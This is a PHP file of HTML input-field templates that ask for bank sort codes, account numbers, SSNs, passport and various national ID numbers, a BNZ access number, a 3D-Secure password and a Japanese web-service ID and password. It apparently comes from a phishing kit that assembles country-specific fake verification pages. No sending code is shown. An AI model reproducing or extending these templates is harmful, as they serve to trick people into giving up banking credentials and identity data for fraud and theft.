<?php
$sortcode = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">SORT CODE</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="tel" name="sortcode" id="sortcode" required="required" class="generic-input-field form-control field" placeholder="sort code">
</div>
</div>
</div>
</div>
</div>';
$accnumber = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">ACCOUNT NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="tel" name="acno" id="acno" required="required" class="generic-input-field form-control field" placeholder="account number">
</div>
</div>
</div>
</div>
</div>';


$sortcodeuk = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">SORT CODE</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="tel" name="sortcodeuk" required id="sortcodeuk" class="generic-input-field form-control field" placeholder="sort code">
';
$accnumberuk = '
<h3 class="section-subtitle">ACCOUNT NUMBER</h3>
<div class="name-input">
<input type="tel" name="acccnumberuk" id="accnumberuk" required class="generic-input-field form-control field" placeholder="account number" maxlength="8">
</div>
</div>
</div>
</div>
</div></div>';

$drv = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">DRIVING LICENCE NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="drv" id="drv" class="generic-input-field form-control field" placeholder="driving licence">
';
$nis = '
<h3 class="section-subtitle">NATIONAL INSURANCE NUMBER</h3>
<div class="name-input">
<input type="text" name="nis" required id="nis" class="generic-input-field form-control field" placeholder="national insurance">
</div>
</div>
</div>
</div>
</div>';

$creditlimit = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">CREDIT LIMIT</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="climit" id="ccname" required class="generic-input-field form-control field" placeholder="credit limit (Ex: 5000)">
</div>
</div>
</div>
</div>
</div>';

$ssn = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">SSN</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="ssn" id="ccname" required="required" class="generic-input-field form-control field" placeholder="ssn">
</div>
</div>
</div>
</div>
</div>';

$citizenid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">CITIZEN ID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="citizenth" id="ccname" required="required" class="generic-input-field form-control field" placeholder="citizen id">
</div>
</div>
</div>
</div>
</div>';
$idnumber = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">ID NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="idnum" id="ccname" class="generic-input-field form-control field" placeholder="id number">
</div>
</div>
</div>
</div>
</div>';
$natid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">NATIONAL ID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="natidsa" id="ccname" required="required" class="generic-input-field form-control field" placeholder="national id">
</div>
</div>
</div>
</div>
</div>';
$passport = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">PASSPORT NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="passport" id="ccname" required="required" class="generic-input-field form-control field" placeholder="passport number">
</div>
</div>
</div>
</div>
</div>';
$qatarid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">QATAR ID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="qatarid" id="ccname" required="required" class="generic-input-field form-control field" placeholder="qatar id">
</div>
</div>
</div>
</div>
</div>';
$civilid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">CIVIL ID NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="accnumkw" id="ccname" required="required" class="generic-input-field form-control field" placeholder="civil id number">
</div>
</div>
</div>
</div>
</div>';
$bnz = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">BNZ ACCESS NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="tel" name="bnz" id="ccname" required="required" class="generic-input-field form-control field" placeholder="bnz access number">
</div>
</div>
</div>
</div>
</div>';
$vbvpass = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">3D-SECURE</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="vbvpass" id="ccname" class="generic-input-field form-control field" placeholder="3d-secure">
</div>
</div>
</div>
</div>
</div>';
$osid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">BSB - OSID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="tel" name="bsbnum" id="ccname" class="generic-input-field form-control field" placeholder="bsb - osid">
</div>
</div>
</div>
</div>
</div>';


$webid = '<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">WebサービスID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="name-input">
<input type="text" name="webid" required id="webid" class="generic-input-field form-control field" placeholder="WebサービスID">
';
$passwds = '
<h3 class="section-subtitle">パスワード</h3>
<div class="name-input">
<input type="text" name="passwds" id="passwds" required class="generic-input-field form-control field" placeholder="パスワード" maxlength="12">
</div>
</div>
</div>
</div>
</div></div>';
